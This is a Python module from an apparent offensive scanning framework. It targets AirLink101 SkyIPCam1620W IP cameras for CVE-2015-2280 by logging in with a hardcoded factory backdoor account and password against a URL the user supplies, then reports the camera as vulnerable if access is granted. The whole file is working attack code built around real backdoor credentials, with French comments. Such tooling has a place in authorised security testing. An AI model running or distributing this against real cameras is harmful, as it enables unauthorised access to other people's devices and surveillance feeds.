import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "airlink101_skyipcam_rce/device_rsp_scan"
        self.description = "AirLink101 SkyIPCam1620W Backdoor Auth & OS Command Injection Scanner (CVE-2015-2280)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;36m[*] Scanning target: airlink101_skyipcam_rce/device_rsp_scan...\033[0m")
        
        url = f"http://{target}:{port}/maker/snwrite.cgi?mac=1234" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}/maker/snwrite.cgi?mac=1234"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        # Identifiants du compte backdoor extrait de usr.ini (productmaker:ftvsbannedcode)
        backdoor_auth = ("productmaker", "ftvsbannedcode")
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.get(url, headers=headers, auth=backdoor_auth)
                
                # Si l'accès est accordé via le compte de secours d'usine
                if response.status_code == 200:
                    return {
                        "vulnerable": True,
                        "details": f"Target is VULNERABLE. Successfully bypassed auth via 'productmaker' backdoor account."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
